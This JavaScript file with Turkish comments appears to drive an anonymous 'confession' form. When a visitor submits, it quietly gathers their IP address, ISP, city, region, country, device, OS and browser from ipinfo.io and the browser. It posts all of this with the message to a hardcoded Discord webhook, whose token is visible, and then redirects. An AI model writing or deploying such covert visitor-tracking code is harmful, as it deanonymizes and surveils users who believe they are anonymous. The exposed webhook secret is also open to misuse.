var sendit = document.querySelector("#sendit");
var input = document.querySelector(".textarea"); // Bu satırı input alanınızın id'sine göre düzenleyin.

$.getJSON('https://ipinfo.io', function(data){
    var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    var device = isMobile ? 'Telefon' : 'Bilgisayar';
    var browser = navigator.userAgent;
    var os = navigator.platform;

    sendit.addEventListener("click" , function(){
        sendMessage();
    });

    function sendMessage() {
        var request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/1182351710857986129/Im0SXuTro-4GcW2rSzQJIe_0URoZJYXvyCbrqAiDg4ecW39Ffjt_CFLhecOc6gHoyOTD");
        request.setRequestHeader('Content-type', 'application/json');
        
        var date = new Date();
        var timestamp = date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + " - " + date.getDate() + "." + (date.getMonth() + 1) + "." + date.getFullYear();
        
        var params = {
            content: (".................... **   **" + "\n> " + "\n> @here" + "\n> **Gönderilme Zamanı:   : **" + "`" + timestamp + "`" + "\n> **IP Adresiniz   : **" +  data.ip  + "\n> **İnternet Servis Sağlayıcınız   : **" + data.org + "\n> **Konumunuz   : **" + data.city + ", " + data.region + ", " + data.country + "\n> **Kullandığınız Sistem:   : **" + device + "\n> **İşletim Sisteminiz:   : **" + os + "\n> **Tarayıcınız:   : **" + browser  + "\n> " + "\n>  **İçerik:   : **" + "`" + input.value + "`"  + "\n> " +   "\n ...................." )
        }
        request.send(JSON.stringify(params));
        request.onload = function() {
            if (request.status == 204) { // HTTP 204 No Content başarılı bir isteği belirtir
                window.location.href = "../ITIRAF 2/index.html"; // Burayı istediğiniz URL ile değiştirin
            }
        }
    }
    
});
